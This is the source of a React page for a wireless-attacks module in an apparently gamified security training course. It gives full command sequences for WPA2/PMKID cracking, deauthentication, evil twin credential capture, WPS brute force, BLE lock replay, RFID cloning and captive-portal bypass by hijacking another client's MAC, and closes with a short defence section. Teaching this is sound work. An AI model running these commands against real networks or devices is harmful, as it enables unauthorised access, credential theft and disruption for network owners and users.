'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#aaff00'
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a3a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#060800', border: '1px solid #2a3800', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#2a3800', marginRight: '8px' }}>//</span>{children}
  </h2>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 600, color: '#88cc00', marginTop: '2rem', marginBottom: '0.75rem' }}>
    &#9658; {children}
  </h3>
)
const P = ({ children }: { children: React.ReactNode }) => <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(170,255,0,0.05)', border: '1px solid rgba(170,255,0,0.2)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#aaff00', letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
  </div>
)
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
      <thead><tr style={{ borderBottom: '1px solid #2a3800' }}>{headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: accent, fontWeight: 600, fontSize: '0.7rem' }}>{h}</th>)}</tr></thead>
      <tbody>{rows.map((row, i) => <tr key={i} style={{ borderBottom: '1px solid #141a00', background: i % 2 === 0 ? 'transparent' : 'rgba(170,255,0,0.02)' }}>{row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a8a', verticalAlign: 'top' }}>{cell}</td>)}</tr>)}</tbody>
    </table>
  </div>
)

export default function WirelessAttacks() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a6a3a' }}>
        <Link href="/" style={{ color: '#5a6a3a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span><span style={{ color: accent }}>MOD-12 // WIRELESS ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(170,255,0,0.08)', border: '1px solid rgba(170,255,0,0.3)', borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(170,255,0,0.1)', border: '1px solid rgba(170,255,0,0.5)', borderRadius: '3px', color: '#aaff00', fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a3a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 12 &middot; CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: 'rgba(170,255,0,0.35) 0 0 20px' }}>WIRELESS ATTACKS</h1>
        <p style={{ color: '#5a6a3a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>WPA2/WPA3 cracking &middot; PMKID &middot; Evil twin &middot; WPS &middot; Bluetooth LE &middot; Zigbee &middot; RFID &middot; Captive portal bypass &middot; Rogue AP</p>
      </div>

      {/* TOC */}
      <div style={{ background: '#070900', border: '1px solid #2a3800', borderRadius: '6px', padding: '1.25rem', marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a3a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>TABLE OF CONTENTS</div>
        {[
          '01 — Wireless Setup & Hardware',
          '02 — WPA2 Cracking',
          '03 — PMKID Attack (No Client Needed)',
          '04 — WPA3 — What Changed and What Still Breaks',
          '05 — Evil Twin Attack',
          '06 — WPS Exploitation',
          '07 — Enterprise WiFi (WPA-Enterprise / 802.1X)',
          '08 — Bluetooth Attacks',
          '09 — Bluetooth LE & IoT',
          '10 — Zigbee & Z-Wave Attacks',
          '11 — RFID & NFC Attacks',
          '12 — Captive Portal Bypass',
          '13 — Wireless Detection & Defence',
        ].map((item, i) => (
          <div key={i} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a6a3a', padding: '3px 0', display: 'flex', gap: '8px' }}>
            <span style={{ color: '#2a3800' }}>&#9002;</span>
            <span>{item}</span>
          </div>
        ))}
      </div>

      <H2>01 — Wireless Setup & Hardware</H2>
      <P>Wireless security testing requires a network adapter that supports monitor mode (passively capturing all packets, not just those addressed to you) and packet injection (sending custom packets). Most built-in laptop WiFi cards do not support these. An external USB adapter is required.</P>
      <Note>In normal mode, your WiFi card ignores packets not meant for it — like how you ignore conversations across a room. Monitor mode is like suddenly being able to hear every conversation in the building simultaneously. Packet injection lets you fabricate and send arbitrary frames — like forging someone else&apos;s return address on a letter.</Note>

      <H3>Recommended Hardware</H3>
      <Table
        headers={['ADAPTER', 'CHIPSET', 'BANDS', 'STRENGTHS']}
        rows={[
          ['Alfa AWUS036ACH', 'RTL8812AU', '2.4GHz + 5GHz', 'Best overall, wide driver support, high power'],
          ['Alfa AWUS036AXML', 'MT7921AUN', '2.4/5/6GHz (WiFi 6E)', 'Modern, WiFi 6E support, newer chipset'],
          ['Alfa AWUS036ACM', 'MT7612U', '2.4GHz + 5GHz', 'Stable, good range, reliable monitor mode'],
          ['Panda PAU09', 'RT5572', '2.4GHz + 5GHz', 'Budget, lightweight, good for basic testing'],
          ['Alfa AWUS036NH', 'RT3070', '2.4GHz only', 'Classic — very stable for legacy WPA2 work'],
        ]}
      />

      <Pre label="// SETUP AND VERIFY MONITOR MODE">{`# Install wireless tools:
sudo apt install aircrack-ng hashcat hcxtools hcxdumptool wireshark iw

# Check for wireless interfaces:
iw dev
iwconfig

# Enable monitor mode:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Or use airmon-ng (easier):
sudo airmon-ng start wlan0  # Creates wlan0mon

# Kill processes that interfere (NetworkManager, wpa_supplicant):
sudo airmon-ng check kill
# Note: this disconnects you from WiFi — use wired or reconnect after

# Verify monitor mode:
iwconfig wlan0mon
# Should show Mode:Monitor

# Test packet injection:
sudo aireplay-ng --test wlan0mon
# Should show: Injection is working!

# Return to managed mode after testing:
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager`}</Pre>

      <H2>02 — WPA2 Cracking</H2>
      <P>WPA2 authentication involves a 4-way handshake between the client and access point when connecting. This handshake contains enough information to verify a password guess offline — meaning once you capture it, you can attempt unlimited password guesses without the network even knowing. Security entirely depends on password strength.</P>
      <Note>Cracking WPA2 does NOT mean breaking the encryption in real-time. It means capturing the handshake (a mathematical proof that you know the password) and then trying millions of password guesses locally on your machine until one produces the same proof. If the password is &apos;password123&apos;, it falls instantly. A random 15-character password would take longer than the age of the universe with any hardware.</Note>

      <Pre label="// CAPTURE AND CRACK WPA2 HANDSHAKE">{`# Step 1: Scan for networks
sudo airodump-ng wlan0mon
# Note: BSSID (AP MAC), Channel, ESSID (network name), Clients

# Step 2: Target specific AP and capture handshake
sudo airodump-ng -c CHANNEL --bssid AP_BSSID -w capture wlan0mon
# Wait for client to connect naturally (slow) OR deauth attack (fast)

# Step 3: Deauthentication attack — force client reconnect
sudo aireplay-ng --deauth 5 -a AP_BSSID -c CLIENT_MAC wlan0mon
# Client temporarily disconnects → reconnects → handshake captured
# Look for: "WPA handshake: AP_BSSID" in airodump-ng output
# Check capture.cap: tcpdump -r capture-01.cap | grep EAPOL

# Step 4: Crack with aircrack-ng (CPU, wordlist-only):
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Step 5: Crack with hashcat (GPU, MUCH faster):
# Convert capture to hashcat format:
hcxpcapngtool -o hash.hc22000 capture-01.cap
# Crack with wordlist:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# Crack with rules (generates mutations):
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Crack with combinator (two wordlists combined):
hashcat -m 22000 hash.hc22000 -a 1 list1.txt list2.txt

# Custom wordlist generation:
# If target uses company name + numbers:
crunch 8 12 0123456789 -t Company@@@ -o custom.txt
# Words from target website (crawl and extract):
cewl https://targetcompany.com -d 2 -m 6 > cewl.txt
# Merge and deduplicate:
cat rockyou.txt cewl.txt | sort -u > combined.txt`}</Pre>

      <H3>Hashcat Rules & Masks</H3>
      <Pre label="// ADVANCED PASSWORD CRACKING">{`# Hashcat rule syntax — transformations applied to each wordlist entry:
# l = lowercase all        u = uppercase all
# c = capitalize first     r = reverse
# d = duplicate            p2 = prepend digit 2 times
# $1 = append "1"          ^! = prepend "!"

# Common patterns (match what most people do):
# password → Password1 → Password1! → P@ssword1
# Rule: c $1 $!  (capitalize + append 1!)
hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule

# Mask attacks (brute force with pattern):
# ?l = lowercase letter   ?u = uppercase letter
# ?d = digit              ?s = special char
# ?a = all printable characters

# 8 char password: uppercase + 6 lowercase + 2 digits
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?d?d

# Hybrid attack (wordlist + mask):
# Passwords like: rockyou_word followed by 2 digits
hashcat -m 22000 hash.hc22000 -a 6 rockyou.txt ?d?d

# Check hashcat benchmark for your hardware:
hashcat -b -m 22000  # how many MH/s your GPU can do
# RTX 4090: ~400,000 H/s for WPA2 — still slow relative to strong passwords`}</Pre>

      <H2>03 — PMKID Attack (No Client Needed)</H2>
      <P>The PMKID attack does not require waiting for a legitimate client to connect, nor does it require sending deauthentication frames. The access point broadcasts the PMKID in its first EAPOL frame, which is accessible to any listening device near the AP.</P>

      <Pre label="// CRACK WPA2 WITHOUT WAITING FOR HANDSHAKE">{`# PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || CLIENT_MAC)
# Contained in first EAPOL frame from AP → no need for client!

# Capture PMKID from all nearby APs:
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
# Wait ~30 seconds to capture PMKIDs from nearby APs

# Target only one specific AP (by BSSID):
echo "AABBCCDDEEFF" > target.txt  # BSSID without colons
sudo hcxdumptool -i wlan0mon --filterlist_ap=target.txt --filtermode=2 -o pmkid.pcapng

# Convert to hashcat format:
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack exactly like handshake:
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 pmkid.hc22000 rockyou.txt -r rules/best64.rule

# hcxdumptool can also capture handshakes while you wait for PMKID:
# It sends deauth frames automatically → combines both approaches`}</Pre>

      <H2>04 — WPA3 — What Changed and What Still Breaks</H2>
      <P>WPA3 introduced SAE (Simultaneous Authentication of Equals), replacing the PSK handshake. SAE uses a Dragonfly key exchange that prevents offline dictionary attacks — even if you capture the 4-way handshake equivalent, you cannot crack it offline without the password. However, WPA3 still has weaknesses.</P>

      <Table
        headers={['VULNERABILITY', 'AFFECT WPA3?', 'DETAILS']}
        rows={[
          ['Offline dictionary attack on handshake', 'No — SAE prevents this', 'SAE does not allow offline cracking'],
          ['PMKID capture + offline crack', 'No — SAE changes key derivation', 'PMKID no longer crackable offline'],
          ['Dragonblood (CVE-2019-9496)', 'Yes — patched but unpatched devices exist', 'Side-channel timing attack on SAE'],
          ['Evil twin / downgrade attack', 'Yes — transition mode', 'If WPA3/WPA2 transition mode enabled, force WPA2 connection'],
          ['Weak/short passwords', 'Partially — online attacks harder but not impossible', 'Side-channel attacks theoretically allow testing'],
          ['Enterprise config attacks', 'Yes — WPA3-Enterprise still uses RADIUS', 'Evil twin captures MSCHAPv2 credentials'],
          ['Management frame attacks', 'Partially addressed', 'PMF (Protected Management Frames) required in WPA3'],
        ]}
      />

      <Pre label="// WPA3 TRANSITION MODE DOWNGRADE">{`# Most deployments use WPA3 Transition Mode (supports both WPA2 + WPA3)
# Goal: force victim device to connect via WPA2 instead of WPA3
# Then: capture WPA2 handshake → offline crack

# Step 1: Set up WPA2-only evil twin with same SSID
# If AP is in transition mode, some clients will accept WPA2
# Tool: hostapd-wpe configured for WPA2 only

# Step 2: Jamming (optional) — force client off WPA3 AP
# Send deauth frames targeting WPA3 AP
# Client roams → finds your WPA2 twin → connects (some clients)

# Dragonblood tools (research):
# https://github.com/vanhoefm/dragonslayer
# Tests for Dragonfly timing + cache attacks
# Requires close proximity and specific vulnerable firmware`}</Pre>

      <H2>05 — Evil Twin Attack</H2>
      <Note>An evil twin is a fake WiFi access point with the same name (SSID) as a legitimate one. When a user&apos;s device connects to your fake AP instead of the real one, all their traffic flows through your machine. The most impactful version targets WPA-Enterprise networks where employees authenticate with domain credentials.</Note>

      <Pre label="// EVIL TWIN VARIANTS">{`# METHOD 1: Open WiFi with captive portal (public spaces)
# Create open AP → all traffic flows through → MITM
sudo airbase-ng -e "Airport_Free_WiFi" -c 6 wlan0mon
# Set up IP forwarding + DHCP:
sudo apt install dnsmasq
# dnsmasq.conf: dhcp-range=10.0.0.10,10.0.0.100
# Configure iptables NAT
# Host fake login portal (Nginx) at 10.0.0.1
# Redirect ALL HTTP to portal via iptables:
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80

# METHOD 2: WPA-Enterprise evil twin (corporate targets)
# WPA-Enterprise uses 802.1X — PEAP/MSCHAPv2 most common
# Evil twin captures: username + MSCHAPv2 challenge/response
# MSCHAPv2 is crackable offline → recover plaintext password

sudo apt install hostapd-wpe
# /etc/hostapd-wpe/hostapd-wpe.conf:
echo 'interface=wlan0mon
driver=nl80211
ssid=Corporate-WiFi
channel=6
wpa=3
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd/hostapd.eap_user' | sudo tee /etc/hostapd-wpe/hostapd-wpe.conf
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Credentials logged: /var/log/hostapd-wpe.log

# Crack MSCHAPv2:
# From log: username, challenge, NT-response
hashcat -m 5500 ntlmv2_hash.txt rockyou.txt
# Or: asleap -C challenge -R response -W rockyou.txt

# METHOD 3: WiFi-Pumpkin3 (all-in-one, GUI):
pip3 install wifi-pumpkin3
wifi-pumpkin3
# Features: captive portal, credential harvesting, network sniffing
# DNS spoofing, SSL stripping, credential phishing pages

# METHOD 4: Bettercap (flexible, scriptable):
sudo apt install bettercap
sudo bettercap -iface wlan0mon
# Commands:
set wifi.ap.ssid TargetNetwork
set wifi.ap.bssid de:ad:be:ef:de:ad
set wifi.ap.channel 6
wifi.recon on
wifi.ap on
# Then enable HTTPS stripping, DNS spoofing:
set net.sniff.output /tmp/capture.pcap
net.sniff on`}</Pre>

      <H2>06 — WPS Exploitation</H2>
      <P>WPS (WiFi Protected Setup) was designed to make connecting devices easier — you press a button or enter an 8-digit PIN. The PIN is the vulnerability: it is verified in two halves, reducing the brute force space from 100 million combinations to just 11,000. Many consumer routers have no lockout mechanism, making WPS cracking trivially easy.</P>

      <Pre label="// BREAK WPS IN HOURS OR SECONDS">{`# Scan for WPS-enabled APs:
sudo wash -i wlan0mon
# Look for: WPS Locked = No (vulnerable)
# WPS 1.0 and 2.0 both potentially vulnerable

# Reaver — standard WPS brute force:
sudo apt install reaver
sudo reaver -i wlan0mon -b AP_BSSID -vv
# Tries all 11,000 PIN combinations
# Rate: ~1-4 seconds per attempt → hours to complete
# Some APs lock after attempts: add --lock-delay=300

# Pixie Dust attack (seconds on vulnerable routers):
sudo reaver -i wlan0mon -b AP_BSSID -vv -K 1
# Many old routers have weak random number generation
# Pixie dust exploits weak entropy to recover PIN in seconds to minutes
# Affected: many Ralink/Realtek/Broadcom chipset routers pre-2015

# Bully — alternative WPS tool:
sudo apt install bully
sudo bully wlan0mon -b AP_BSSID -d -v 3 -p

# Check if Pixie Dust applicable:
# Tool: pixiewps (standalone pixie dust tool)
sudo apt install pixiewps

# Defence:
# Disable WPS entirely in router admin panel
# WPS provides minimal convenience vs significant security risk`}</Pre>

      <H2>07 — Enterprise WiFi (WPA-Enterprise / 802.1X)</H2>
      <P>Corporate networks use WPA-Enterprise which authenticates users with credentials against a RADIUS server, not a shared password. The most common configuration is PEAP-MSCHAPv2, which is vulnerable to evil twin attacks that capture the domain credentials. A successful attack yields domain username/password.</P>

      <Pre label="// WPA-ENTERPRISE ATTACK AND CREDENTIAL CAPTURE">{`# WPA-Enterprise authentication flow:
# 1. Client connects to AP → AP asks RADIUS server to authenticate
# 2. RADIUS challenges client with MSCHAPv2
# 3. Client responds with hashed domain credentials
# 4. RADIUS verifies → grants/denies access

# Evil twin captures this exchange:
# Our fake AP: run RADIUS with hostapd-wpe
# Client thinks they are connecting to corporate AP
# Our RADIUS requests credentials → client sends MSCHAPv2 response
# We log: username, challenge, NT-response → crack offline

# After capturing MSCHAPv2 hashes:
# 1. Crack with hashcat (if password in wordlist):
hashcat -m 5500 "username:::challenge:response" rockyou.txt

# 2. Relay attack — don't crack, relay directly:
# If internal services also use NTLM:
# Relay captured MSCHAPv2 to internal SMB/HTTP → authenticate as victim
# Tool: impacket-ntlmrelayx (requires LAN access after initial connect)

# Certificate validation:
# If client validates server certificate → evil twin fails
# Many corporate configs don't enforce cert validation (for ease of onboarding)
# Check: does client connect without complaint? If yes → cert not validated

# Eaphammer — WPA-Enterprise attacks:
git clone https://github.com/s0lst1c3/eaphammer
pip install -r requirements.txt
./eaphammer --cert-wizard  # generate cert for evil twin
./eaphammer -i wlan0mon --essid Corporate-WiFi --creds
# More feature-rich than hostapd-wpe alone`}</Pre>

      <H2>08 — Bluetooth Attacks</H2>
      <Pre label="// BLUETOOTH CLASSIC EXPLOITATION">{`# Install Bluetooth tools:
sudo apt install bluez bluetooth bluez-tools
sudo apt install bluehydra  # BT recon + logging
pip install bleak  # Python BT library

# Scan for Bluetooth devices:
hcitool scan         # Classic Bluetooth devices
sudo hcitool lescan  # BLE (Low Energy) devices
bluetoothctl scan on && bluetoothctl devices

# Get detailed device info:
hcitool info DEVICE_MAC
# Shows: device class, manufacturer, services

# BlueSmack (DoS — Ping of Death):
sudo l2ping -i hci0 -s 600 -f DEVICE_MAC
# Large L2CAP ping → crash/freeze some older devices

# BlueSnarfing — read data from unpatched devices:
# Reads phonebook, calendar, messages from devices with OBEX exposed
# Requires old device (pre-2005 mostly) without pairing requirement
# Tool: bluesnarfer (educational/legacy)

# BlueBorne (CVE-2017-1000251):
# RCE via Bluetooth without any pairing required
# Affected: Linux (kernel), Android, Windows, iOS (2017)
# Patched but unpatched embedded/IoT devices still vulnerable
# PoC: https://github.com/ArmisSecurity/blueborne

# Bluetooth impersonation attack (BIAS — CVE-2020-10135):
# Bypass authentication in Bluetooth Classic
# Downgrade secure connection → legacy authentication
# Impersonate a paired device
# Tool: bias-poc (academic)

# Btlejuice / BtleJack — BLE MITM:
pip install btlejack
# Intercept BLE connections in real-time
# Requires hardware: Ubertooth One or nRF52 dongle`}</Pre>

      <H2>09 — Bluetooth LE & IoT</H2>
      <Note>Bluetooth Low Energy (BLE) is everywhere in modern IoT devices: smart locks, medical devices, fitness trackers, industrial sensors. Unlike Classic Bluetooth, BLE was designed for low power — and security was often an afterthought. Many BLE devices broadcast sensitive data unencrypted, use predictable pairing PINs, or lack proper authentication entirely.</Note>

      <Pre label="// BLE SECURITY TESTING">{`# BLE basics:
# Devices advertise on channels 37, 38, 39 (every 20-10000ms)
# GATT (Generic Attribute Profile): services + characteristics
# Service: group of related data (e.g., Heart Rate service)
# Characteristic: individual data point (e.g., heart rate measurement)

# Scan for BLE devices:
sudo hcitool lescan
# Or with gatttool:
sudo gatttool -b DEVICE_MAC -I
# In gatttool: connect, primary, characteristics

# List all characteristics:
gatttool -b DEVICE_MAC --char-desc
# Read a characteristic:
gatttool -b DEVICE_MAC --char-read -a HANDLE
# Write to characteristic:
gatttool -b DEVICE_MAC --char-write-req -a HANDLE -n VALUE

# Check for unencrypted advertising data:
sudo apt install blueman
# Or use nRF Connect app (Android) to see raw advertisement data
# Some devices broadcast sensitive data (temperature, status, identity) unencrypted

# Sniff BLE with Ubertooth One (hardware required):
ubertooth-btle -f -t DEVICE_MAC  # follow specific device
ubertooth-btle -f -c capture.pcap  # capture to file for Wireshark analysis

# Replay attacks on BLE smart locks:
# 1. Capture "unlock" command with Ubertooth or logic analyser
# 2. Identify characteristic handle and unlock command value
# 3. Replay: gatttool -b LOCK_MAC --char-write-req -a HANDLE -n UNLOCK_VALUE

# BTLE fuzzing:
pip install btle-fuzzer
# Send malformed GATT requests → crash/unexpected behaviour

# Common vulnerabilities in BLE devices:
# 1. Static PIN (0000, 1234) — sniff and replay
# 2. Unauthenticated characteristics — write any value without pairing
# 3. Insecure pairing modes — Just Works = no MITM protection
# 4. Replay attack vulnerability — no nonce/counter in commands
# 5. Unencrypted notifications — read sensitive data passively`}</Pre>

      <H2>10 — Zigbee & Z-Wave Attacks</H2>
      <P>Zigbee and Z-Wave are wireless protocols used in home automation and industrial control systems — smart bulbs, thermostats, door locks, sensors, SCADA systems. They operate on 2.4GHz (Zigbee) and 908MHz (Z-Wave) and have been found vulnerable to a range of attacks from eavesdropping to key extraction.</P>

      <Pre label="// ZIGBEE AND Z-WAVE SECURITY TESTING">{`# Hardware needed:
# Zigbee: HackRF One, YARD Stick One, or Attify Zigbee Framework hardware
# Z-Wave: Z-Wave sniffer (e.g., Aeotec Z-Stick), HackRF One
# SDR: RTL-SDR dongle (~$25) for passive monitoring

# Zigbee sniffing:
# KillerBee framework:
sudo apt install python3-killerbee
# With YARD Stick One or RZ RAVEN USB:
zbdump -c 11 -w capture.pcap  # capture on channel 11
zbstumbler  # scan for Zigbee networks

# Zigbee attack types:
# 1. Network key extraction — if key is in OTA update
# 2. Replay attack — record and replay device commands
# 3. Jamming — send signals on Zigbee channel → DoS
# 4. Touchlink commissioning attack:
#    zbass  # force device into factory reset and steal pairing

# Zigbee encryption:
# AES-128 CCM* with network key
# Key often hardcoded or derivable from manufacturer
# Some devices use default key: "ZigBeeAlliance09"

# Z-Wave sniffing:
# Z-Wave operates on 908.42MHz (US) / 868.42MHz (EU)
# Z-Wave S2 security (2017+): strong AES-128 CCM
# Older Z-Wave S0: vulnerable to key extraction
# Tool: Scapy Z-Wave layer, or commercial tools

# SDR for wireless recon:
# rtl_433: decode many common IoT/wireless protocols
sudo apt install rtl-433
rtl_433  # auto-decode nearby wireless transmissions
# Decodes: weather stations, smart meters, garage openers, car key fobs, etc.`}</Pre>

      <H2>11 — RFID & NFC Attacks</H2>
      <Pre label="// RFID AND NFC CLONING">{`# RFID frequency bands:
# LF (125-134kHz): HID, EM4100, Indala — most hotel/office badges
# HF (13.56MHz): MIFARE Classic, DESFire, NTAG — contactless payment, modern access
# UHF (860-960MHz): supply chain, inventory tags

# Flipper Zero — versatile security tool:
# Read LF/HF RFID, Bluetooth, WiFi, Sub-GHz, IR
# Read and clone most proximity cards instantly
# Store and emulate multiple cards

# Proxmark3 — advanced RFID research tool:
# Professional RFID analysis and cloning
# Longer range than Flipper (custom antenna)
# Can crack MIFARE Classic keys

# Clone LF (EM4100/HID) card:
# These have NO security — any reader/writer can clone them
# Proxmark3: lf em 410x read → lf em 410x clone
# Flipper Zero: RFID → Read → Save → Emulate

# MIFARE Classic (13.56MHz) attack:
# Many old access control systems use MIFARE Classic
# Vulnerable to: Dark-Side, Nested, MFOC attacks
# Default keys in common readers: d3 f7 d3 f7 d3 f7
proxmark3 -p /dev/ttyACM0
pm3 > hf mf autopwn  # auto-crack MIFARE Classic

# NFC attacks:
# NFCGate: Android app for MITM NFC relay attacks
# Relay attack: one phone near victim's card, one near reader
# Payment relay: copy card communication in real-time

# Defence:
# RFID blocking wallets/sleeves (for LF and HF cards)
# Use MIFARE DESFire EV2/EV3 (no known attacks)
# Implement reader-side validation (card + PIN, biometric)`}</Pre>

      <H2>12 — Captive Portal Bypass</H2>
      <Pre label="// BYPASS HOTEL / AIRPORT / CAFE WIFI">{`# Method 1: MAC Address Spoofing (most reliable)
# Find a MAC of a device already authenticated on the network
sudo airodump-ng wlan0mon  # scan, note a connected STATION MAC
# Spoof your MAC to match theirs:
sudo ip link set wlan0 down
sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF  # use found MAC
sudo ip link set wlan0 up
# You inherit their authenticated session

# Method 2: DNS Tunneling (works when DNS allowed pre-auth)
# Most captive portals allow DNS queries before authentication
# DNS tunnel: encode data in DNS queries/responses
# iodine — DNS tunnel:
# Server side (your VPS with domain):
sudo iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com
# Client:
sudo iodine -f -P password tunnel.yourdomain.com
# Tunnel interface (dns0) now has connectivity → route traffic through it

# Method 3: ICMP Tunnel
# Some portals allow ICMP (ping) pre-auth
# Hans — ICMP tunnel:
# Server: sudo hans -s 10.0.0.1 -p password
# Client: sudo hans -c SERVER_IP -p password

# Method 4: SSH over port 443 (HTTPS allowed pre-auth)
# If port 443 is open before authentication:
ssh -p 443 user@YOUR_VPS -D 1080  # SOCKS proxy
# Configure browser: SOCKS5 localhost:1080
# All browser traffic tunnelled through VPS

# Method 5: HTTP CONNECT proxy bypass
# Try: CONNECT yourvps.com:22 HTTP/1.1
# Some captive portals proxy HTTPS transparently before auth

# Quick test order:
# 1. Try MAC spoofing (zero setup, usually works)
# 2. Try SSH port 443
# 3. Try DNS tunnelling (most reliable when others fail)`}</Pre>

      <H2>13 — Wireless Detection & Defence</H2>
      <Table
        headers={['ATTACK', 'DETECTION METHOD', 'PREVENTION']}
        rows={[
          ['Deauth attack', 'WIDS (Wireless IDS) — abnormal deauth frame rate', 'PMF (802.11w) — authenticates management frames'],
          ['Evil twin', 'WIDS monitors for duplicate SSIDs, signal strength anomalies', 'Strict WPA-Enterprise cert validation, WIDS'],
          ['WPS brute force', 'Login attempts in router logs, lockout triggers', 'Disable WPS entirely'],
          ['PMKID/handshake capture', 'Passive — undetectable without WIDS', 'Strong random password (15+ chars), WPA3'],
          ['Rogue AP', 'WIDS, 802.1X port auth on wired side', 'NAC (Network Access Control), port security'],
          ['BLE sniffing', 'Undetectable passively', 'Enable encryption, randomise BLE MAC address'],
        ]}
      />

      <Pre label="// WIRELESS DEFENCE BASELINE">{`# Corporate wireless security checklist:
# ✓ WPA3-Enterprise (or at minimum WPA2-Enterprise with PMF)
# ✓ Validate server certificate on all clients (prevent evil twin)
# ✓ Disable WPS on all access points
# ✓ Separate SSIDs: corporate (802.1X) vs guest (isolated VLAN)
# ✓ Wireless IDS/IPS (Cisco DNA, Aruba, Meraki WIDS)
# ✓ MAC address filtering as additional layer (not sole control)
# ✓ Rogue AP detection and alerting
# ✓ Regular wireless surveys to find unauthorised APs
# ✓ Prevent ad-hoc mode connections

# Home/SOHO:
# ✓ WPA3-Personal (or WPA2 with AES, not TKIP)
# ✓ Password: 15+ random characters (passphrase format)
# ✓ Disable WPS
# ✓ Disable UPnP
# ✓ Guest network isolated from main LAN
# ✓ Change default admin credentials on router`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a2e1e' }}>
        <div style={{ background: 'rgba(170,255,0,0.04)', border: '1px solid rgba(170,255,0,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#3a4a1a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: '#aaff00', marginBottom: '0.5rem', fontWeight: 600 }}>MOD-12 Interactive Lab</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', marginBottom: '1.5rem' }}>5 steps &middot; 135 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: '#aaff00', padding: '12px 32px', border: '1px solid rgba(170,255,0,0.6)', borderRadius: '6px', background: 'rgba(170,255,0,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(170,255,0,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
